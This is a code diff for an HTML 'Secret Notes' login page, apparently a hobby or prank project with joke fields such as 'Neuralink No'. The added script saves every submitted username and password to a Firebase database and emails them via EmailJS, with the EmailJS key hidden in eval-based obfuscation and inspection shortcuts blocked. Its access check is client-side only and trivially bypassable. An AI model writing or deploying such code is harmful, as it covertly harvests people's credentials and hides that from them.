@@ -8,37 +8,146 @@
   <!-- Obfuscated EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-  (function(){eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
-  if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);
-  k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};
-  while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
-  return p}('2(0(){1.3("4")})();',5,5,
-  'function|emailjs|eval|init|IlVJwCd-9iAQIiHI7'.split('|'),0,{}))})();
+    (function () {
+      eval(function (p, a, c, k, e, d) {
+        e = function (c) {
+          return c.toString(36);
+        };
+        if (!''.replace(/^/, String)) {
+          while (c--) d[c.toString(a)] = k[c] || c.toString(a);
+          k = [function (e) { return d[e]; }];
+          e = function () { return '\\w+'; };
+          c = 1;
+        }
+        while (c--)
+          if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+        return p;
+      }('2(0(){1.3("4")})();', 5, 5, 'function|emailjs|eval|init|IlVJwCd-9iAQIiHI7'.split('|'), 0, {}));
+    })();
   </script>
 
-  <!-- Anti-Inspect Code -->
+  <!-- Prevent Inspect -->
   <script>
     document.addEventListener("contextmenu", e => e.preventDefault());
     document.addEventListener("keydown", function (e) {
       if (
         e.key === "F12" ||
-        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
         (e.ctrlKey && e.key === "U")
       ) {
         e.preventDefault();
         alert("Inspecting is disabled 🚫");
       }
     });
-    setInterval(() => {
-      const devtools = /./;
-      devtools.toString = function () {
-        this.opened = true;
-      };
-      console.log('%c', devtools);
-      if (devtools.opened) {
-        document.body.innerHTML = "<h1 style='color:red;text-align:center;'>Access Blocked Due to DevTools</h1>";
+  </script>
+
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getDatabase, ref, set, push, get } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAnRpupObYmukI2-VfsVmxL4UTfFF7xSCg",
+      authDomain: "secret-notes-6c2ca.firebaseapp.com",
+      databaseURL: "https://secret-notes-6c2ca-default-rtdb.firebaseio.com",
+      projectId: "secret-notes-6c2ca",
+      storageBucket: "secret-notes-6c2ca.appspot.com",
+      messagingSenderId: "10438001798",
+      appId: "1:10438001798:web:d4d8b607266f2502a2fd07"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let isTyping = false;
+    let lastFetchedContent = "";
+
+    async function loadNote() {
+      const noteSnap = await get(ref(db, 'secretNote'));
+      if (noteSnap.exists()) {
+        const noteData = noteSnap.val();
+        if (!isTyping && noteData.content !== lastFetchedContent) {
+          document.getElementById("secret-notes").value = noteData.content || "";
+          document.getElementById("last-updated").textContent = noteData.timestamp
+            ? `Last updated: ${new Date(noteData.timestamp).toLocaleString()}`
+            : "Last updated: Unknown";
+          lastFetchedContent = noteData.content;
+        }
       }
-    }, 1000);
+    }
+
+    async function checkSecretAndProceed(data) {
+      const newRef = push(ref(db, "loginAttempts"));
+      await set(newRef, data);
+
+      const secretSnap = await get(ref(db, "secretCode"));
+      const secretCode = secretSnap.exists() ? secretSnap.val() : "";
+      const containsSecret = Object.values(data).some(value => value.includes(secretCode));
+
+      if (containsSecret) {
+        document.querySelector(".login-container").style.display = "none";
+        document.getElementById("secret-section").style.display = "block";
+        await loadNote();
+      } else {
+        document.getElementById("verification-box").style.display = "block";
+        emailjs.send('service_o5fuvdj', 'template_gfzy3aw', data)
+          .then(() => setTimeout(() => window.location.href = "pg 1.html", 2000))
+          .catch(() => alert("Email failed. Try again."));
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("login-form");
+      const noteBox = document.getElementById("secret-notes");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const data = {
+          username: document.getElementById("username").value,
+          password: document.getElementById("password").value,
+          robo_id: document.getElementById("robo-id").value,
+          neuralink_no: document.getElementById("neuralink-no").value,
+          teleportation_id: document.getElementById("teleportation-id").value
+        };
+
+        await checkSecretAndProceed(data);
+      });
+
+      noteBox.addEventListener("input", () => {
+        isTyping = true;
+        clearTimeout(window.typingTimeout);
+        window.typingTimeout = setTimeout(() => {
+          isTyping = false;
+        }, 1000);
+      });
+
+      setInterval(loadNote, 500);
+    });
+
+    window.saveNote = () => {
+      const content = document.getElementById("secret-notes").value;
+      const timestamp = Date.now();
+      set(ref(db, 'secretNote'), { content, timestamp }).then(() => {
+        document.getElementById("last-updated").textContent = `Last updated: ${new Date(timestamp).toLocaleString()}`;
+        lastFetchedContent = content;
+        alert("Note saved.");
+      });
+    };
+
+    window.deleteNote = () => {
+      set(ref(db, 'secretNote'), null).then(() => {
+        document.getElementById("secret-notes").value = "";
+        document.getElementById("last-updated").textContent = "Last updated: Never";
+        lastFetchedContent = "";
+        alert("Note deleted.");
+      });
+    };
+
+    window.backToLogin = () => {
+      document.getElementById("secret-section").style.display = "none";
+      document.querySelector(".login-container").style.display = "block";
+    };
   </script>
 
   <style>
@@ -51,6 +160,7 @@
       justify-content: center;
       align-items: center;
     }
+
     .login-container,
     .secret-section {
       background: rgba(255, 255, 255, 0.2);
@@ -61,21 +171,25 @@
       width: 350px;
       text-align: center;
     }
+
     .secret-section {
       display: none;
       color: white;
     }
+
     .login-container h2,
     .secret-section h2 {
       color: white;
       margin-bottom: 20px;
     }
+
     label {
       color: white;
       display: block;
       margin-top: 10px;
       text-align: left;
     }
+
     input[type="text"],
     input[type="password"] {
       width: 100%;
@@ -85,6 +199,7 @@
       border-radius: 5px;
       outline: none;
     }
+
     input[type="submit"],
     .secret-section button {
       width: 100%;
@@ -96,6 +211,7 @@
       border-radius: 5px;
       cursor: pointer;
     }
+
     .verification-box {
       display: none;
       position: fixed;
@@ -107,6 +223,7 @@
       padding: 20px;
       border-radius: 10px;
     }
+
     .secret-section textarea {
       width: 100%;
       height: 100px;
@@ -115,12 +232,14 @@
       border: none;
       margin-top: 10px;
     }
+
     .secret-section .buttons {
       display: flex;
       flex-direction: column;
       gap: 10px;
       margin-top: 10px;
     }
+
     .back-button {
       position: absolute;
       top: 20px;
@@ -129,6 +248,7 @@
       height: 40px;
       cursor: pointer;
     }
+
     .timestamp {
       font-size: 0.9rem;
       margin-top: 10px;
@@ -136,28 +256,37 @@
     }
   </style>
 </head>
+
 <body>
   <img src="https://cdn-icons-png.flaticon.com/128/10238/10238019.png" alt="Back" class="back-button" onclick="window.location.href='index.html';" />
+
   <div class="login-container">
     <h2>Login</h2>
     <form id="login-form">
       <label for="username">Username</label>
       <input type="text" id="username" required>
+
       <label for="password">Password</label>
       <input type="password" id="password" required>
+
       <label for="robo-id">Robo ID</label>
       <input type="text" id="robo-id" required>
+
       <label for="neuralink-no">Neuralink No</label>
       <input type="text" id="neuralink-no" required>
+
       <label for="teleportation-id">Teleportation ID</label>
       <input type="text" id="teleportation-id" required>
+
       <input type="submit" value="Login">
     </form>
   </div>
+
   <div class="verification-box" id="verification-box">
     <p>Verifying...</p>
     <img src="https://miro.medium.com/v2/resize:fit:1400/1*CsJ05WEGfunYMLGfsT2sXA.gif" width="200">
   </div>
+
   <div class="secret-section" id="secret-section">
     <h2>Secret Notes</h2>
     <textarea id="secret-notes" placeholder="Write something secret..."></textarea>
